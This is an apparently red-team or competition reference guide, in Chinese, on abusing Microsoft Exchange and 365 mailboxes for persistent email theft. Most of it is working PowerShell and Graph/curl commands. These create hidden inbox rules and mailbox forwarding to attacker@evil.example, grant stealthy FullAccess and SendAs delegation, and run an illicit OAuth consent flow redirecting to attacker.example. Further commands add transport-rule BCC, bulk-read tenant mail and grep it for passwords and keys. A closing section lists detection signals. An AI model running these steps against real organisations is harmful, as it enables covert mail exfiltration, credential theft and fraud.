# 邮箱滥用：转发、委派、OAuth 授权、拉信与持久化验证

> 被 `competition-mailbox-abuse` 引用。邮箱是少数**「一条配置改动就能持续产出情报」**的攻击面：
> 不需要再碰主机、不需要再认证，只要规则还在，邮件就一直流出来。
>
> 但这里最容易出的错是：**拿到 token 就写「控制邮箱」，改了规则就写「持久化成功」**。
> 本文要求每一步都落到「邮件真的改了流向」这个可观测事实上。

## 一、四条独立的路，先分清你走的是哪条

| 路径 | 前提 | 持久在哪 | 稳不稳定 |
| --- | --- | --- | --- |
| **A. 隐藏收件箱规则** | 有邮箱访问权（密码/token/委派） | 邮箱内的 `MessageRule` 对象 | 很稳（不依赖密码，改密也不失效） |
| **B. 委派 / 完全访问权限** | 有管理员权限（Exchange 或 Graph） | 邮箱 ACL（`FullAccess`/`SendAs`） | 稳（但要管理员每次查 ACL） |
| **C. OAuth 应用授权（illicit consent）** | 用户点了同意，或拿到管理员同意 | Azure AD 的 `servicePrincipal` + `oauth2PermissionGrant` | 很稳（有 `offline_access` 就有 refresh token） |
| **D. 传输层改向** | Exchange 管理员 | 传输规则（Transport Rule）/ 连接器 | 稳但**影响全组织**，噪声极大 |

**判据**：A 与 C 是「不需要再认证」的持久化，B 与 D 需要持续的管理员权限。
报告里要明确写属于哪一类，因为修复动作完全不同。

## 二、A：收件箱规则（最常用，也最容易验证）

### 枚举（Exchange PowerShell，on-prem 与 EXO 通用）

```powershell
# 列出某邮箱的所有规则（含隐藏的）
Get-InboxRule -Mailbox alice@corp.local |
  Format-List Name, RuleIdentity, Enabled, Priority, Description, ForwardTo,
              RedirectTo, ForwardAsAttachmentTo, DeleteMessage, MarkAsRead,
              StopProcessingRules

# 全组织扫「有外部转发」的规则（管理员权限）
Get-Mailbox -ResultSize Unlimited |
  ForEach-Object {
    Get-InboxRule -Mailbox $_.Identity -ErrorAction SilentlyContinue |
      Where-Object { $_.ForwardTo -or $_.RedirectTo -or $_.ForwardAsAttachmentTo }
  } | Select-Object MailboxOwnerId, Name, ForwardTo, RedirectTo

# 邮箱级转发（不是规则，是 Set-Mailbox 的属性）
Get-Mailbox alice@corp.local |
  Select-Object ForwardingAddress, ForwardingSmtpAddress, DeliverToMailboxAndForward
```

### 创建（三种「藏」法）

```powershell
# 1) 最基础：关键词命中就转发，并标记已读 + 删原件（用户看不见）
New-InboxRule -Mailbox alice@corp.local -Name "..." `
  -SubjectContainsWords "invoice","payment","密码","VPN" `
  -ForwardTo attacker@evil.example -MarkAsRead $true -DeleteMessage $true `
  -StopProcessingRules $true

# 2) 用「看起来像系统规则」的名字，排在最前（Priority 0）
New-InboxRule -Mailbox alice@corp.local -Name "Microsoft Outlook" `
  -From "ceo@corp.local" -ForwardAsAttachmentTo attacker@evil.example `
  -MarkAsRead $true

# 3) 全量转发（不筛关键词，最省事也最吵）
Set-InboxRule -Mailbox alice@corp.local -Identity "..." `
  -ForwardTo attacker@evil.example -DeleteMessage $false

# 4) 直接改邮箱转发属性（不经规则引擎，某些审计看不到）
Set-Mailbox -Identity alice@corp.local `
  -ForwardingSmtpAddress "smtp:attacker@evil.example" `
  -DeliverToMailboxAndForward $true
```

**为什么 `-DeleteMessage $true -StopProcessingRules $true` 是「隐藏」的关键**：
- `MarkAsRead` 让用户看不到未读提示；
- `DeleteMessage` 让原件不出现在收件箱（用户以为没收到）；
- `StopProcessingRules` 让后续规则（含企业的 DLP 规则）不再处理这封邮件。

### 规则命名的隐蔽技巧（仅用于评估检测能力）

| 技巧 | 效果 |
| --- | --- |
| 名字以 `.` 或空格开头 | 在 OWA 规则列表里排最前，且视觉上像占位符 |
| 名字用系统默认文案（`Microsoft Outlook`、`Clear categories on mail`） | 用户扫一眼以为是内置规则 |
| 名字用非 ASCII 同形字符 | 视觉与真规则无法区分 |
| `Priority 0` + `StopProcessingRules` | 后续规则全部失效，DLP 也拦不到 |

## 三、B：委派与完全访问

```powershell
# 谁对这个邮箱有权限（关键：排除 SELF 与系统账号）
Get-MailboxPermission -Identity alice@corp.local |
  Where-Object { $_.User -notlike "NT AUTHORITY\SELF" -and $_.IsInherited -eq $false } |
  Format-Table User, AccessRights, Deny, IsInherited

# 加完全访问（等价于能读全部邮件、能代表她发信）
Add-MailboxPermission -Identity alice@corp.local -User attacker@corp.local `
  -AccessRights FullAccess -InheritanceType All -AutoMapping $false

# SendAs（发信时显示为对方，不显示「代表」）
Add-RecipientPermission -Identity alice@corp.local -Trustee attacker@corp.local `
  -AccessRights SendAs -Confirm:$false

# 日历/文件夹级委派（更隐蔽，常被漏查）
Get-MailboxFolderPermission -Identity alice@corp.local:\Calendar
Add-MailboxFolderPermission -Identity alice@corp.local:\Calendar `
  -User attacker@corp.local -AccessRights Editor

# 共享邮箱的权限（共享邮箱没有密码，只能靠委派）
Get-Mailbox -RecipientTypeDetails SharedMailbox -ResultSize Unlimited |
  ForEach-Object { Get-MailboxPermission -Identity $_.Identity |
    Where-Object { $_.User -notlike "NT AUTHORITY\SELF" } }
```

**`-AutoMapping $false` 很重要**：默认 `$true` 会让 Outlook **自动弹出**对方的邮箱，
用户立刻发现。设 `$false` 后只有主动添加才看得到——这是「不被发现」的关键参数。

**验伤**：用被授权账号访问一次：

```powershell
# EXO / on-prem 都可以用这条验证实际可读
Get-MailboxFolderStatistics -Identity alice@corp.local |
  Select-Object Name, ItemsInFolder
```

或直接拉一封信（见第五节）。

## 四、C：OAuth 应用授权（现代环境的主路）

### 原理与两种同意

| 类型 | 谁点同意 | 得到什么 |
| --- | --- | --- |
| **用户同意（illicit consent）** | 受害者本人 | `access_token` + `refresh_token`（有 `offline_access` 时长期有效） |
| **管理员同意（admin consent）** | 管理员（常通过「需要管理员批准」链接诱导） | 应用级权限（`Mail.Read` 等 `Application` 权限），**全租户所有邮箱** |

关键 scope：

| scope | 能做什么 |
| --- | --- |
| `Mail.Read` / `Mail.ReadWrite` | 读/改邮件 |
| `Mail.Send` | 以用户身份发信 |
| `MailboxSettings.ReadWrite` | **改转发设置、改规则** |
| `offline_access` | 拿 refresh token（**持久化的核心**） |
| `Files.Read.All`、`Sites.Read.All` | 顺带拿文件（常被一起同意） |

### 授权链（可复现的最小流程）

```bash
# 1) 构造授权 URL（诱导点击；client_id 是攻击者注册的应用）
#    https://login.microsoftonline.com/common/oauth2/v2.0/authorize
#      ?client_id=<APP_ID>
#      &response_type=code
#      &redirect_uri=https://attacker.example/cb
#      &response_mode=query
#      &scope=offline_access%20Mail.Read%20Mail.Send%20MailboxSettings.ReadWrite
#      &state=xyz

# 2) 回调拿到 code 后换 token（攻击者服务器侧执行）
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=<APP_ID>" \
  -d "client_secret=<APP_SECRET>" \
  -d "grant_type=authorization_code" \
  -d "code=<CODE>" \
  -d "redirect_uri=https://attacker.example/cb" \
  -d "scope=offline_access Mail.Read Mail.Send MailboxSettings.ReadWrite"

# 3) 用 refresh token 续期（不需要用户再登录）
curl -s -X POST "https://login.microsoftonline.com/common/oauth2/v2.0/token" \
  -d "client_id=<APP_ID>" -d "client_secret=<APP_SECRET>" \
  -d "grant_type=refresh_token" -d "refresh_token=<RT>"
```

**验伤**：拿到 `access_token` 后必须**至少成功调一次 API**：

```bash
curl -s -H "Authorization: Bearer $AT" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=3&\$select=subject,from,receivedDateTime"
```

返回 `value` 数组才算。反例：token 拿到但 API 返回 `403 Forbidden` →
scope 未被同意（`Mail.Read` 缺失）或需要管理员同意（`AADSTS65001`）。

### 用 Graph 改规则/转发（持久化落地）

```bash
# 列规则
curl -s -H "Authorization: Bearer $AT" \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules"

# 建规则（Graph 的规则对象字段：conditions / actions）
curl -s -X POST -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messageRules" \
  -d '{
    "displayName": ".",
    "sequence": 1,
    "isEnabled": true,
    "conditions": { "subjectContains": ["invoice","payment"] },
    "actions": {
      "forwardTo": [{"emailAddress":{"address":"attacker@evil.example"}}],
      "markAsRead": true,
      "delete": true,
      "stopProcessingRules": true
    }
  }'

# 改邮箱转发设置
curl -s -X PATCH -H "Authorization: Bearer $AT" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/me/mailboxSettings" \
  -d '{"automaticRepliesSetting":{"status":"disabled"},
       "forwardingSmtpAddress":"smtp:attacker@evil.example"}'
```

> **注**：`forwardingSmtpAddress` 在 Graph 的 `mailboxSettings` 上是否可写取决于租户策略
> （`Set-Mailbox` 的 `ForwardingSmtpAddress` 也有同样的外部转发限制）。
> 若 PATCH 返回 `400`，改用 Exchange PowerShell（第三节）或 Graph 的规则接口。
> **不要假设写完就生效**——一律回读一次确认。

### 应用级权限（admin consent）下的批量读取

```bash
# 应用权限下读任意用户（需要 Application 权限 Mail.Read）
curl -s -H "Authorization: Bearer $APP_TOKEN" \
  "https://graph.microsoft.com/v1.0/users/alice@corp.com/messages?\$top=10"

# 或直接对整个租户做消息搜索
curl -s -X POST -H "Authorization: Bearer $APP_TOKEN" -H "Content-Type: application/json" \
  "https://graph.microsoft.com/v1.0/search/query" \
  -d '{"requests":[{"entityTypes":["message"],"query":{"queryString":"password OR vpn OR invoice"},
       "from":0,"size":50}]}'
```

**判据**：应用级 token 的 `roles` 声明里含 `Mail.Read`（JWT 里能看到），
且能读**别人的**邮箱——用户级 token 只能读 `/me`。

## 五、拉信：三条通道与命令

### 通道 1：Graph（最现代，优先）

```bash
# 列表 + 只取需要的字段
curl -s -H "Authorization: Bearer $AT" \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=50&\$select=subject,from,toRecipients,receivedDateTime,hasAttachments"

# 取正文（含 HTML）
curl -s -H "Authorization: Bearer $AT" \
  "https://graph.microsoft.com/v1.0/me/messages/<ID>?\$select=subject,body,internetMessageHeaders"

# 附件
curl -s -H "Authorization: Bearer $AT" \
  "https://graph.microsoft.com/v1.0/me/messages/<ID>/attachments"

# 搜索（KQL，服务端执行，效率高）
curl -s -G -H "Authorization: Bearer $AT" \
  --data-urlencode '$search="password"' \
  "https://graph.microsoft.com/v1.0/me/messages?\$top=25"
```

### 通道 2：EWS（on-prem Exchange 主路）

```bash
# EWS 端点探测（不需要凭据也能看是否存在 + 版本）
curl -s -o /dev/null -w "%{http_code}\n" https://mail.corp.local/EWS/Exchange.asmx
curl -s https://mail.corp.local/autodiscover/autodiscover.xml -d '<Autodiscover/>' | head

# 用 MailSniper（PowerShell）搜索（参数以 Get-Help 为准）
Invoke-SelfSearch -Mailbox alice@corp.local -ExchHostname mail.corp.local `
  -ExchangeVersion Exchange2013_SP1 -Remote -OutputCsv .\mail.csv
```

**EWS 的替代**：`exchangelib`（Python）能直接脚本化：

```python
from exchangelib import Credentials, Account, Configuration
creds = Credentials("corp.local\\alice", "Passw0rd!")
acct = Account("alice@corp.local", credentials=creds, autodiscover=True)
for m in acct.inbox.filter(subject__contains="invoice")[:20]:
    print(m.datetime_received, m.sender, m.subject, m.text_body[:200])
```

### 通道 3：IMAP/POP（只在开启时）

```bash
# 探测（很多 on-prem 环境仍开 IMAP）
openssl s_client -connect mail.corp.local:993 -quiet
# 登录 + 列表
curl -s --url "imaps://mail.corp.local/" --user "corp.local\alice:Passw0rd!" -X "LIST \"\" \"*\""
```

## 六、从邮件内容里挖凭据与拓扑（这是「拉信」的真正目的）

邮件是最容易被忽略的凭据仓库。要按这个顺序搜：

| 目标 | 搜索关键词 / 模式 | 典型产出 |
| --- | --- | --- |
| 初始口令 | `初始密码`、`initial password`、`temporary password`、`您的账号` | 新员工/新系统账号的明文口令 |
| VPN / 远程接入 | `VPN`、`AnyConnect`、`FortiClient`、`GlobalProtect` | 用户名 + 口令 + 网关地址 |
| 系统上线通知 | `上线`、`go-live`、`connection string`、`账号如下` | DB 连接串、服务账号 |
| 内网拓扑 | `http://10.`、`\\`、`\\fileserver`、`smb://`、`ftp://` | 内网主机名、共享路径、内部系统 URL |
| CI/CD 与代码库 | `gitlab`、`jenkins`、`token`、`deploy key` | 代码库地址 + 访问 token |
| 云账号 | `AWS`、`AKIA`、`azure`、`subscription` | Access Key、租户 ID |
| 财务/审批流程 | `付款`、`审批`、`发票`、`bank` | 业务流程（用于社工，不是技术凭据） |

**正则（拉下来的邮件全文里跑）**：

```bash
# AWS Access Key / 私钥 / 连接串 / 内网 IP
grep -aEho "AKIA[0-9A-Z]{16}" *.eml | sort -u
grep -aEho "-----BEGIN [A-Z ]*PRIVATE KEY-----" *.eml | sort -u
grep -aEho "(jdbc|mongodb|redis|mysql|postgres(ql)?)://[^\"' <>]+" *.eml | sort -u
grep -aEho "\b(10|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}\b" *.eml | sort -u

# 「密码：xxx」类中文模式
grep -aEho "(密码|口令|初始密码)[：: ]+[A-Za-z0-9!@#$%^&*._-]{6,}" *.eml | sort -u
```

**注意**：这些正则会大量误报（尤其内网 IP）。报告里要给出**上下文片段**（前后 80 字符），
否则「搜到一个 IP」不能当情报。

## 七、D：传输层改向（噪声最大，慎用）

```powershell
# 全组织 BCC 到外部（这是最粗暴也最容易被抓的一条）
New-TransportRule -Name "..." -FromScope InOrganization `
  -BlindCopyTo "attacker@evil.example" -SentToScope NotInOrganization

# 只在特定关键词命中时改向
New-TransportRule -Name "..." -SubjectContainsWords "invoice","payment" `
  -BlindCopyTo "attacker@evil.example"

# 看现有规则（这一条是蓝队必查项）
Get-TransportRule | Format-List Name, State, Description, BlindCopyTo, RedirectMessageTo
```

**为什么噪声大**：传输规则**对所有经过该 Hub 的邮件生效**，一开就影响成百上千人，
而且 Exchange 管理中心的「邮件流」面板会立刻显示规则数量变化。**只在授权明确覆盖时使用**。

## 八、验伤：怎么证明「持久化还在」

这是本类题目最核心的一节。三种证据，按强度排序：

### 证据 1：规则真的触发了（最强）

```powershell
# 发一封测试邮件（命中关键词），然后看是否被转发
Send-MailMessage -From "test@corp.local" -To "alice@corp.local" `
  -Subject "invoice 2026-11" -Body "test" -SmtpServer "mail.corp.local"

# 等 1-2 分钟后查消息跟踪（EXO）
Get-MessageTrace -SenderAddress "test@corp.local" -StartDate (Get-Date).AddMinutes(-10) |
  Select-Object Received, SenderAddress, RecipientAddress, Subject, Status

# on-prem 用
Get-MessageTrackingLog -Sender "test@corp.local" -Start (Get-Date).AddMinutes(-10) |
  Select-Object Timestamp, EventId, RecipientAddress, MessageSubject
```

**判据**：跟踪日志里出现**两条**记录：一条 `DELIVER` 到 alice，一条 `DELIVER`/`SEND` 到 `attacker@evil.example`。
只有一条 → 规则没生效（或外部转发被组织策略拦了）。

### 证据 2：规则对象仍在（中等）

```powershell
Get-InboxRule -Mailbox alice@corp.local | Where-Object Name -eq "." |
  Select-Object Name, Enabled, Priority, ForwardTo, Description
```

`Enabled=True` 且 `Description` 里有转发目标 → 规则存在，但**不证明会触发**（可能被组织级策略覆盖）。

### 证据 3：OAuth 授权仍在（中等）

```bash
# 看 service principal 的 grant（需要读权限）
curl -s -H "Authorization: Bearer $ADMIN_TOKEN" \
  "https://graph.microsoft.com/v1.0/oauth2PermissionGrants?\$filter=clientId eq '<APP_OBJECT_ID>'"
```

```powershell
# 或用 Microsoft Graph PowerShell
Connect-MgGraph -Scopes "Directory.Read.All"
Get-MgOauth2PermissionGrant -Filter "clientId eq '<APP_OBJECT_ID>'" |
  Select-Object ClientId, ResourceId, Scope, ConsentType
```

`Scope` 含 `Mail.Read` 且 `ConsentType=Principal` → 用户同意仍在；
若 `ConsentType=AllPrincipals` → 管理员同意（影响全租户）。

### 反例（看起来成功其实是假）

| 现象 | 真相 |
| --- | --- |
| `New-InboxRule` 返回对象但 `Get-InboxRule` 查不到 | 规则被组织级 `Set-OrganizationConfig -InboxRules` 策略限制，写入被静默忽略 |
| 规则存在，但外部转发不到 | 组织开了 `RemoteDomain` 的 `AutoForwardEnabled=$false`，外部自动转发被禁 |
| Graph 建规则成功但 Outlook 里看不到 | 规则建在 `inbox` 文件夹，用户看的是「收件箱」子文件夹的规则视图 |
| token 有效但 `Mail.Read` 调用 403 | scope 只有 `User.Read`；或需要 admin consent |
| 委派加了但用户看不到邮箱 | `-AutoMapping $true`（默认）时才自动挂载；`$false` 需手动添加 |

## 九、检测视角

| 动作 | 日志 | 信号 |
| --- | --- | --- |
| 建/改收件箱规则 | **统一审计日志（UAL）**：`New-InboxRule`、`Set-InboxRule`、`UpdateInboxRules` | `Parameters` 含 `ForwardTo`/`RedirectTo` 且域名不在允许列表 |
| 邮箱级转发 | UAL `Set-Mailbox` | `Parameters` 含 `ForwardingSmtpAddress` |
| 加完全访问 | UAL `Add-MailboxPermission` | `Parameters` 含 `FullAccess`，`User` 非 IT 组 |
| 加 SendAs | UAL `Add-RecipientPermission` | 同上 |
| 日历委派 | UAL `Add-MailboxFolderPermission` | 目标为 `\Calendar` |
| OAuth 同意 | Azure AD 审计 `Consent to application` | 应用是新注册的、`Reply URL` 指向陌生域、scope 含 `Mail.Read`/`offline_access` |
| 管理员同意 | Azure AD 审计 `Consent to application`（`ConsentType=AllPrincipals`） | 同一应用短时间被大量用户同意（consent grant 攻击） |
| 应用凭据新增 | Azure AD 审计 `Add service principal credentials` / `Update application – Certificates and secrets management` | 给已有应用加 secret（**后门**，比新建应用更隐蔽） |
| 大量拉信 | UAL `MailItemsAccessed`（需开启） | 单用户在短时间内访问数百封不同邮件；或用 Application 权限跨邮箱 |
| 传输规则 | UAL `New-TransportRule` / `Set-TransportRule` | `BlindCopyTo`/`RedirectMessageTo` 指向外部 |
| IMAP/POP 登录 | Exchange `Imap4`/`Pop3` 协议日志 | 该用户历史上从未用过 IMAP 却突然登录 |

```powershell
# 查 UAL（EXO）
Search-UnifiedAuditLog -StartDate (Get-Date).AddDays(-7) -EndDate (Get-Date) `
  -Operations New-InboxRule,Set-InboxRule,UpdateInboxRules,Add-MailboxPermission `
  -ResultSize 5000 | Select-Object CreationDate, UserIds, Operations, AuditData

# 查邮箱审计（on-prem，需先开 audit）
Search-MailboxAuditLog -Identity alice@corp.local -LogonTypes Owner,Delegate `
  -StartDate (Get-Date).AddDays(-7) -ShowDetails
```

**响度**：传输规则 = **极高**（管理员面板立刻可见）；加 FullAccess = **高**（管理员常规巡检项）；
建收件箱规则 = **中低**（每天都有正常用户建规则，靠「转发到外部域」这一条筛）；
OAuth 同意 = **中**（取决于租户是否开了「用户同意」限制）。

## 十、常见坑

1. **规则写进去了但被组织策略覆盖**。`Set-OrganizationConfig` 的 `InboxRules` 相关策略、
   以及 `RemoteDomain` 的 `AutoForwardEnabled` 都会让转发静默失效。**先查策略，再下结论**。
2. **外部转发被 `RemoteDomain` 拦**。判据：消息跟踪里能看到 `FAIL`/`QUARANTINE` 事件，且
   `Get-RemoteDomain -Identity "*" | fl AutoForwardEnabled` 为 `False`。
3. **`-AutoMapping $true` 暴露自己**。默认值就是 `$true`，会让对方 Outlook 自动挂载你的邮箱。
   加委派时**必须显式 `-AutoMapping $false`**。
4. **只验证「规则存在」，不验证「邮件流动」**。第九节的证据 1 才是结论；证据 2 只是中间态。
5. **refresh token 过期不自知**。`offline_access` 的 RT 默认 90 天，但**改密码会吊销**
   （除非应用有 `Mail.Read` 的 Application 权限）。续期失败报 `invalid_grant`，
   要先判断是「过期」还是「被吊销」（`AADSTS70000` / `AADSTS50173`）。
6. **Graph 建规则用了 `displayName` 但漏了 `isEnabled`**。默认 `true`，但漏 `sequence` 时规则排在最后，
   可能被前面的 `StopProcessingRules` 规则吃掉。
7. **把 UAL 的 `Operations` 名字写错**。`New-InboxRule` 与 `Set-InboxRule` 是两个不同操作；
   查「改规则」要同时查 `Set-InboxRule` 和 `UpdateInboxRules`（后者是客户端批量提交）。
8. **在 on-prem 上找 UAL**。on-prem **没有** UAL，只有邮箱审计（`Search-MailboxAuditLog`）与
   管理员审计（`Search-AdminAuditLog`），且**默认未开启**（`Set-Mailbox -AuditEnabled $true`）。
9. **共享邮箱没有密码就放弃**。共享邮箱的价值全在委派边（第三节最后一条命令），
   不必有密码也能读。
10. **忽略「应用凭据后门」**。给一个已有的合法应用加 secret，比新建一个应用隐蔽得多；
    审计里是 `Add service principal credentials`，不是 `Add application`。